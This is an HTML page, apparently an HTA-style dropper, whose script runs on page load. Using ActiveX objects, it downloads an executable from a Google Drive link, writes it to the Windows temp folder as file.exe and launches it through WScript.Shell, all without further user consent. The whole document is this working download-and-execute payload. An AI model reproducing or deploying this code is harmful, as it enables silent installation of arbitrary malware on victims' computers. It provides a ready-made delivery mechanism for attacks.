<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download and Run File</title>
    <script type="text/javascript">
        function downloadAndRun() {
            var fileURL = 'https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H';  // File URL
            var fileName = 'file.exe';

            try {
                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
                xhr.open("GET", fileURL, false);  // Use false for synchronous
                xhr.send();

                if (xhr.status == 200) {
                    var fileData = xhr.responseBody;
                    var fso = new ActiveXObject("Scripting.FileSystemObject");
                    var tempFolder = fso.GetSpecialFolder(2); // Get the temp folder
                    var filePath = tempFolder + "\\" + fileName;

                    var fileStream = new ActiveXObject("ADODB.Stream");
                    fileStream.Open();
                    fileStream.Type = 1;  // Binary
                    fileStream.Write(fileData);
                    fileStream.SaveToFile(filePath, 2);  // Save the file
                    fileStream.Close();

                    // Run the downloaded file
                    var shell = new ActiveXObject("WScript.Shell");
                    shell.Run(filePath);
                } else {
                    alert("Error downloading file.");
                }
            } catch (e) {
                alert("An error occurred: " + e.message);
            }
        }
    </script>
</head>
<body onload="downloadAndRun();">
    <h1>Downloading and Running File...</h1>
</body>
</html>
